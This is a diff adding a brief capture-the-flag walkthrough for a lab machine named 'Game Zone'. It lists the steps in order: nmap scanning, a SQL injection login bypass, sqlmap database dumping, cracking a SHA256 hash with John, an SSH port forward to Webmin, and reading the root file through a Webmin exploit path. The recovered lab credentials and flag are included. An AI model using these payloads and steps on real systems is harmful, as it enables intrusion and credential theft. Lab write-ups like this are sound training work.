@@ -1,0 +1,55 @@
+Game Zone
+
+ping 10.10.147.79
+nmap -sV -sC 10.10.147.79
+nmap -sV -sC -p- 10.10.147.79
+
+Apache httpd 2.4.18 ((Ubuntu)) PORT=80
+
+Login Bypass
+
+username: ' or 1=1 -- -
+passwd: blank
+
+http://10.10.147.79/portal.php
+
+Burp - Intercept - copy to file - request.txt
+
+sqlmap -r request.txt 
+sqlmap -r request.txt --dbms=mysql --dump
+
+
+Username: agent47
+Passwd: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+
+Cracking a password with JohnTheRipper:
+
+hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+
+videogamer124
+
+ssh agent47@10.10.147.79
+
+Exposing services with reverse SSH tunnels 
+
+ss -tulpn
+
+ssh -L 10000:localhost:10000 agent47@10.10.147.79
+
+
+Navigate to localhost:10000
+
+
+Post Exploittion:
+
+searchsploit Webmin 1.5
+searchsploit -m unix/remote/21851.rb
+
+Navigate to localhost:10000/file/show.cgi/root/root.txt
+
+
+
+FLAG: 
+User = 649ac17b1480ac13ef1e4fa579dac95c
+Root = 
